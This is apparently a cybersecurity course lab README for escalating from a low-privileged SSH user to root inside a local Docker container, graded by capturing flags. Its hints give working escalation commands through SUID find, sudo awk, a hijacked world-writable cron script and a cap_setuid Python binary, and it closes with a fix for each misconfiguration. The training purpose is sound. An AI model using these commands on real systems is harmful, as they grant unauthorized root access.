# Lab 07: Linux Privilege Escalation

**Roadmap:** Phase 3 (privilege escalation — GTFOBins, linPEAS, capabilities) · **Time:** 4–6 hours · **Points:** 14

## Scenario
You've phished a developer and landed a shell on `app-server` as the low-privileged user **`webdev`**
(password `Foothold-2024!`). This is exactly where most real intrusions begin: you have *a* foothold, but
not root. Your job is **local privilege escalation** — find the misconfigurations that let an ordinary user
become `root`.

There are **five independent ways to root** on this box, each guarding a flag in `/root/flags/` that only
root can read. Find them all.

> This is the step *after* Lab 06: you exploited the web app, now you escalate on the host you landed on.

## Get your foothold
```powershell
cd "C:\Users\S I N O\Downloads\ciber security labs\labs\lab07-privesc"
docker compose up -d --build
ssh webdev@localhost -p 2207       # password: Foothold-2024!
```
You're now `webdev`. Confirm with `id` — you are **not** root (uid=1000). Everything from here is done
inside that SSH session.

## Read first (about 1.5 h)
1. Linux privesc methodology (what to enumerate first): https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/ (classic) and https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/linux-privilege-escalation/ (comprehensive)
2. **GTFOBins** — how "normal" binaries become privesc tools: https://gtfobins.github.io/
3. SUID/SGID abuse: search GTFOBins for `find`, filter **SUID**.
4. sudo abuse: GTFOBins, filter **Sudo**.
5. Linux capabilities (`getcap`, `cap_setuid`): https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/linux-privilege-escalation/#capabilities
6. Cron job privesc: writable scripts run by root on a schedule.

## Enumerate like linPEAS would
Before exploiting, *look*. These are the commands that find every vector in this lab:
```bash
id; sudo -l                               # who am I, what can I sudo?
find / -perm -4000 -type f 2>/dev/null    # SUID binaries
getcap -r / 2>/dev/null                   # file capabilities
cat /etc/cron.d/* ; ls -la /opt           # scheduled jobs + writable scripts
```

---

## Tasks (14 pts)
Each flag looks like `FLAG{...}`. Become root your way, then read and submit each one.

| # | Vector | OWASP/MITRE | Pts |
|---|--------|-------------|-----|
| 1 | **Enumerate.** Which SUID binary here is the odd one out (not a normal system SUID)? Give its full path. | — | 1 |
| 2 | **SUID privesc.** Abuse that SUID binary to read `/root/flags/suid.txt`. | T1548.001 | 3 |
| 3 | **sudo privesc.** `webdev` can run one command as root with no password. Abuse it (GTFOBins) and read `/root/flags/sudo.txt`. | T1548.003 | 3 |
| 4 | **cron privesc.** A root cron job runs a world-writable script every minute. Hijack it to read `/root/flags/cron.txt`. | T1053.003 | 3 |
| 5 | **capability privesc.** A binary has a dangerous Linux capability. Use it to become root and read `/root/flags/caps.txt`. | T1548 | 3 |
| 6 | **Knowledge.** Which MITRE ATT&CK **technique ID** covers abusing SUID/SGID bits? | — | 1 |

### Starter nudges (work out the exact commands yourself)
```bash
# Task 2 - SUID find keeps root privileges; -p stops the shell dropping them.
#   Look up "find" on GTFOBins (SUID). Then: cat /root/flags/suid.txt

# Task 3 - what can you sudo?  sudo -l   (then find that binary on GTFOBins, "Sudo")

# Task 4 - append a command to the cron script, then WAIT ~60s, then read your output.
#   e.g. make root copy the flag somewhere you can read it.
echo '...your command...' >> /opt/maintenance/cleanup.sh

# Task 5 - getcap -r / 2>/dev/null  shows which binary has cap_setuid.
#   A capability-enabled python can do:  os.setuid(0)  then spawn a shell.
```

### Hints
<details><summary>Task 2</summary>GTFOBins "find" SUID entry: <code>find . -exec /bin/sh -p \; -quit</code> gives you a shell whose effective uid is root. Then <code>cat /root/flags/suid.txt</code>. (Or read it directly: <code>find /root/flags/suid.txt -exec cat {} \;</code>.)</details>
<details><summary>Task 3</summary><code>sudo awk 'BEGIN{system("/bin/sh")}'</code> drops you into a root shell. Then read the flag.</details>
<details><summary>Task 4</summary>The script runs as root. Add a line that copies the flag to a world-readable place, e.g. <code>cp /root/flags/cron.txt /tmp/c.txt; chmod 644 /tmp/c.txt</code>. Wait for the next minute, then <code>cat /tmp/c.txt</code>.</details>
<details><summary>Task 5</summary><code>/opt/scripts/pyadmin -c 'import os; os.setuid(0); os.system("/bin/bash")'</code> → root shell → read <code>/root/flags/caps.txt</code>.</details>

---

## Submitting
In chat: `lab 7 task 1: /usr/bin/...`, `lab 7 task 2: FLAG{...}`, `lab 7 task 6: T1548.001`, etc.

## Write it up
In `lab07-privesc/report.md`, for **each** vector write: how you found it (the enumeration command),
the exploit, and — most important for interviews — **the fix**:
- SUID: remove the bit (`chmod u-s`), or don't ship SUID on shell-capable binaries.
- sudo: scope `NOPASSWD` to exact, non-shell-spawning commands; never `awk`/`vi`/`find`.
- cron: root-owned scripts must not be writable by others (`chmod 755`, correct ownership).
- capabilities: grant the least capability needed, never `cap_setuid` on an interpreter.

## Reset (new flags)
```powershell
docker compose down -v; docker compose up -d --build
```
